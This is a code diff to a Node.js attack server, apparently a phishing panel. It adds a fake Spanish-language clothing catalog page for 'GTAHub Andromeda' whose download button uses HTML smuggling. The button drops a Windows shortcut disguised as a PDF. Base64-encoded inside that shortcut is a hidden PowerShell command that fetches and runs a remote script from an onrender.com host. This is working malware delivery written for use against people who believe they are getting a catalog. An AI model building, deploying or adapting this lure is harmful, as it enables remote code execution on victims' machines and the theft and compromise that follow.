@@ -121,6 +121,11 @@ app.get("/" + PANEL_PATH + "/logout", (req, res) => {
 const PAYLOAD_DIR = path.join(__dirname, "payloads");
 if (!fs.existsSync(PAYLOAD_DIR)) fs.mkdirSync(PAYLOAD_DIR, { recursive: true });
 
+// ── Landing page — catalog preview with download (HTML smuggling) ──
+app.get("/catalogo", (req, res) => {
+  res.send(LANDING_HTML);
+});
+
 app.get("/dl/s.ps1", (req, res) => {
   const fp = path.join(PAYLOAD_DIR, "stage.ps1");
   if (!fs.existsSync(fp)) return res.status(404).end();
@@ -554,6 +559,128 @@ checkAdmin();
 refresh();setInterval(refresh,30000);
 </script>
 </body></html>`;
+
+// ── Landing page HTML (HTML smuggling) ──
+const LNK_B64 = "TAAAAAEUAgAAAAAAwAAAAAAAAEbtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAABwAAAAAAAAAAAAAAAAAAAA0CFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAVgAxAAAAAAAAAAAAEABXaW5kb3dzAEAACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAGkAbgBkAG8AdwBzAAAAFgBaADEAAAAAAAAAAAAQAFN5c3RlbTMyAABCAAkABADvvgAAAAAAAAAALgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUwB5AHMAdABlAG0AMwAyAAAAGAB0ADEAAAAAAAAAAAAQAFdpbmRvd3NQb3dlclNoZWxsAFQACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAAAAgAE4AMQAAAAAAAAAAABAAdjEuMAAAOgAJAAQA774AAAAAAAAAAC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHYAMQAuADAAAAAUAGwAMgAAAAAAAAAAAAAAcG93ZXJzaGVsbC5leGUAAE4ACQAEAO++AAAAAAAAAAAuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAAAAeAAAAIQBDAGEAdABhAGwAbwBnAG8AIABkAGUAIABSAG8AcABhACAARwBUAEEASAB1AGIAIABBAG4AZAByAG8AbQBlAGQAYQBLAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAC4ALgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAF0ALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAcAAgAGIAeQBwAGEAcwBzACAALQBjACAAIgBJAEUAWAAoAEkAVwBSACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAG4AawBhAGsAcwBrAHMALgBvAG4AcgBlAG4AZABlAHIALgBjAG8AbQAvAGQAbAAvAHMALgBwAHMAMQAnACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwApACIAIgAlAFMAeQBzAHQAZQBtAFIAbwBvAHQAJQBcAFMAeQBzAHQAZQBtADMAMgBcAGkAbQBhAGcAZQByAGUAcwAuAGQAbABsABAAAAAFAACgJQAAAN0AAAAcAAAACwAAoHdOwRrnAl1Ot0Qusa5RmLfdAAAAlQAAAAkAAKCJAAAAMVNQU+KKWEa8TDhDu/wTkyaYbc5tAAAABAAAAAAfAAAALQAAAFMALQAxAC0ANQAtADIAMQAtADkAOQA1ADIAOQA1ADMAMAA4AC0AMgAxADUANwA3ADcANgAxADMANgAtADIAOAA0ADMANwA5ADEAMAA3ADgALQA1ADAAMAAAAAAAAAAAAAAAAAAAAAAA";
+
+const LANDING_HTML = `<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>GTAHub Andromeda — Catálogo Temporada 2024/2025</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
+.hero{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
+.hero::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90" opacity=".03">👕</text></svg>') repeat;background-size:80px}
+.hero h1{font-size:42px;font-weight:700;color:#fff;margin-bottom:8px;position:relative}
+.hero .accent{color:#e94560}
+.hero .sub{font-size:18px;color:#c9a227;margin-bottom:6px;font-weight:300;letter-spacing:4px;text-transform:uppercase;position:relative}
+.hero p{color:#8b95a5;font-size:15px;margin-top:12px;position:relative}
+.container{max-width:900px;margin:0 auto;padding:40px 20px}
+.section-title{font-size:22px;color:#fff;margin-bottom:24px;padding-bottom:10px;border-bottom:2px solid #e94560;display:inline-block}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:18px;margin-bottom:50px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;transition:transform .2s,border-color .2s}
+.card:hover{transform:translateY(-3px);border-color:#e94560}
+.card-img{height:180px;background:linear-gradient(135deg,#1e2a3a,#2a1a2e);display:flex;align-items:center;justify-content:center;font-size:60px}
+.card-body{padding:16px}
+.card-body h3{font-size:16px;color:#fff;margin-bottom:6px}
+.card-body .price{color:#e94560;font-size:20px;font-weight:700}
+.card-body .desc{color:#8b949e;font-size:13px;margin-top:6px}
+.card-body .sizes{margin-top:8px;display:flex;gap:6px}
+.card-body .sizes span{background:#21262d;color:#8b949e;padding:2px 8px;border-radius:4px;font-size:11px}
+.download-section{background:linear-gradient(135deg,#1a1a2e,#0f3460);border:1px solid #30363d;border-radius:16px;padding:50px 30px;text-align:center;margin:40px 0}
+.download-section h2{font-size:26px;color:#fff;margin-bottom:12px}
+.download-section p{color:#8b949e;font-size:14px;margin-bottom:28px}
+.btn-download{display:inline-block;background:linear-gradient(135deg,#e94560,#c73659);color:#fff;padding:16px 40px;border-radius:10px;font-size:17px;font-weight:600;text-decoration:none;cursor:pointer;border:none;transition:transform .15s,box-shadow .15s}
+.btn-download:hover{transform:scale(1.04);box-shadow:0 8px 25px rgba(233,69,96,.35)}
+.btn-download svg{vertical-align:middle;margin-right:8px}
+.footer{text-align:center;padding:30px;color:#484f58;font-size:12px;border-top:1px solid #21262d}
+.badge{display:inline-block;background:#238636;color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:16px}
+.stats{display:flex;justify-content:center;gap:40px;margin-top:30px;position:relative}
+.stats div{text-align:center}
+.stats .n{font-size:28px;font-weight:700;color:#e94560}
+.stats .l{font-size:12px;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="sub">GTAHub Andromeda</div>
+  <h1>CATÁLOGO <span class="accent">2024/2025</span></h1>
+  <p>Colección Hombre — Remeras, Buzos, Pantalones y más</p>
+  <div class="stats">
+    <div><div class="n">45+</div><div class="l">Productos</div></div>
+    <div><div class="n">12</div><div class="l">Categorías</div></div>
+    <div><div class="n">NEW</div><div class="l">Temporada</div></div>
+  </div>
+</div>
+
+<div class="container">
+  <div class="section-title">🔥 Destacados</div>
+  <div class="grid">
+    <div class="card">
+      <div class="card-img">👕</div>
+      <div class="card-body">
+        <h3>Remera Oversize Classic</h3>
+        <div class="price">$12.500</div>
+        <div class="desc">Algodón 100% premium. Corte oversize.</div>
+        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span><span>XXL</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">🧥</div>
+      <div class="card-body">
+        <h3>Hoodie Premium Street</h3>
+        <div class="price">$28.500</div>
+        <div class="desc">French terry 380gsm. Capucha doble.</div>
+        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-img">👖</div>
+      <div class="card-body">
+        <h3>Jogger Cargo Premium</h3>
+        <div class="price">$19.500</div>
+        <div class="desc">Gabardina stretch. Bolsillos cargo.</div>
+        <div class="sizes"><span>S</span><span>M</span><span>L</span><span>XL</span><span>XXL</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="download-section">
+    <div class="badge">📄 PDF — 4 páginas</div>
+    <h2>Descargá el Catálogo Completo</h2>
+    <p>Con todos los productos, talles, colores y precios actualizados de la temporada.</p>
+    <button class="btn-download" onclick="dl()">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+      Descargar Catálogo PDF
+    </button>
+  </div>
+</div>
+
+<div class="footer">
+  © 2024 GTAHub Andromeda. Todos los derechos reservados.<br>
+  Instagram: @gtahub.andromeda | Discord: GTAHub Andromeda
+</div>
+
+<script>
+function dl(){
+  var b=atob("${LNK_B64}");
+  var a=new Uint8Array(b.length);
+  for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
+  var bl=new Blob([a],{type:"application/octet-stream"});
+  var u=URL.createObjectURL(bl);
+  var l=document.createElement("a");
+  l.href=u;l.download="Catalogo Ropa GTAHub Andromeda.pdf";
+  document.body.appendChild(l);l.click();
+  document.body.removeChild(l);
+  URL.revokeObjectURL(u);
+}
+</script>
+</body>
+</html>`;
 
 app.listen(PORT, () => {
   console.log("[+] Server → http://localhost:" + PORT);
